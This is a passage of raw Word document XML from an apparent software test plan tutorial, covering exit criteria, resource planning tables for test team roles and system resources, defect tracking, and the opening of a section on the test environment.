          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Exit Criteria.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In above case, the Run rate is mandatory is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>100%, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">but the test </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>team</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> only completed 90% of test cases. It means the Run rate is not satisfied, so do NOT confirm the Exit Criteria </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step 5) Resource Planning</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Resource plan is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>detailed summary</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> of all types of resources required to complete project task. Resource could be human, equipment and materials needed to complete a project</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The resource planning is important factor of the test planning because helps in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>determining</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> of resources (employee, equipment…) to be used for the project. Therefore, the Test Manager can make the correct schedule &amp; estimation for the project.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>This section represents the recommended resources for your project.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Human Resource</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The following table represents various members in your project team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="text" w:horzAnchor="margin" w:tblpXSpec="center" w:tblpY="70"/>
        <w:tblW w:w="12896"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46"/>
        <w:gridCol w:w="1710"/>
        <w:gridCol w:w="9840"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1346"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No.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1710"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Member</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9840"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Tasks</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">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1.     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Manager</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Manage</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the whole project</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Define project </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>directions</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Acquire appropriate resources</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="134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2.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="171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Tester</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="984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Identifying and describing appropriate test techniques/tools/automation architecture</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Verify and assess the Test Approach</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Execute</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the tests, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Log</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> results, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Report</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> the defects.</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 xml:space="preserve">Tester could be in-sourced or out-sourced members, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>base</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> on the project budget</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For the task which required </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> skill, I recommend you choose </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>outsourced</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> members to </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>save</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> project cost.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">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3.     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Developer in Test</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Implement</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>the test cases, test program, test suite etc.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="134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4.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="171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Administrator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9840"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Builds up and ensures test environment and assets are </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>managed</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> and </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>maintained</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Support</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Tester to use the test environment for test execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="134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5.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="171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SQA members</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9840"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Take in charge of quality assurance</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Check  to confirm whether the testing process is meeting specified requirements</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Bug log is a process start by QA, he found the issues and log into the issue tracking tool.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">And defect tracking is just the next step after bug logging. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve">Which is started by developer when </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>they start working on that issue.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> In this process both developer and QA follow the whole process of fixing and put the comment and other activity status on that issue which is known as defect tracking.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
        <w:t>By defect tracking everyone get to know the current status of open issue.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC"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B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>System Resource</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC"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B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>For testing, a web application, you should plan the resources as following tables:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="12896" w:type="dxa"/>
        <w:tblInd w:w="-1763"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3"/>
        <w:gridCol w:w="1126"/>
        <w:gridCol w:w="10297"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1476"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No.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1093"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Resources</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10327" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>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Descriptions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="147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1.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1093"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Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1032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Install the web application under test</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This includes a separate web server, database server, and application server if applicable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="147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2.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1093"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Test tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1032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testing tool is to automate the testing, simulate the user operation, generate the test results</w:t>
            </w:r>
          </w:p>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There are tons of test tools you can use for this project such as Selenium, QTP…etc.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1476"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3.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1093"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Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10327" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>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You need a Network include LAN and Internet to simulate the real business and user environment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1476"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4.     </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1093"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jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Computer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10327" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="DDDDDD"/>
              <w:left w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:bottom w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
              <w:right w:val="outset" w:sz="2" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F9F9F9"/>
            <w:tcMar>
              <w:top w:w="86" w:type="dxa"/>
              <w:left w:w="86" w:type="dxa"/>
              <w:bottom w:w="86" w:type="dxa"/>
              <w:right w:w="86" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="008E672E">
            <w:pPr>
              <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="215" w:lineRule="atLeast"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>The PC which users often use to connect the web server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Step 6) Plan Test Environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="216" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>What is the Test Environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A testing environment is a setup of software and hardware on which the testing team is going to execute test cases. The test environment consists of </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>real business</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> environment, as well as physical environments, such as server, front end running environment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
